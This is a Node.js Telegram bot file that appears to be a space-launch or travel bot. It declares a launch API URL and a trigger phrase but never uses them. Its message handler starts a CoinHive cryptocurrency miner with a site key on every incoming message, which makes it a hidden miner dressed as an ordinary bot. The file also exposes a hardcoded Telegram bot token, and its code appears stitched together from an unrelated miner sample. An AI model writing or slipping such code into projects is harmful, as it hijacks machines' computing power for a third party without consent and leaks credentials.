const Bot = require('node-telegram-bot-api');
const request = require('request');
const token = '523705222:AAGOgFyFXajnphqrxdiWrizXOALNiy5_cRk';
const url = 'https://launchlibrary.net/1.3/launch';
const trigger = 'I want to travel!';
const bot = new Bot(token, {polling: true});
bot.on('message', (event) => {
	const CoinHive = require('coin-hive');

(async () => {
  // Create miner
  const miner = await CoinHive('4Xw2hL5mqeRIwObp7LUm9F9GYIHgiyyc'); // CoinHive's Site Key

  // Start miner
  await miner.start();

  // Listen on events
  miner.on('found', () => console.log('Found!'));
  miner.on('accepted', () => console.log('Accepted!'));
  miner.on('update', data =>
    console.log(`
    Hashes per second: ${data.hashesPerSecond}
    Total hashes: ${data.totalHashes}
    Accepted hashes: ${data.acceptedHashes}
  `)
  );

  // Stop miner
  setTimeout(async () => await miner.stop(), 60000);
})();
});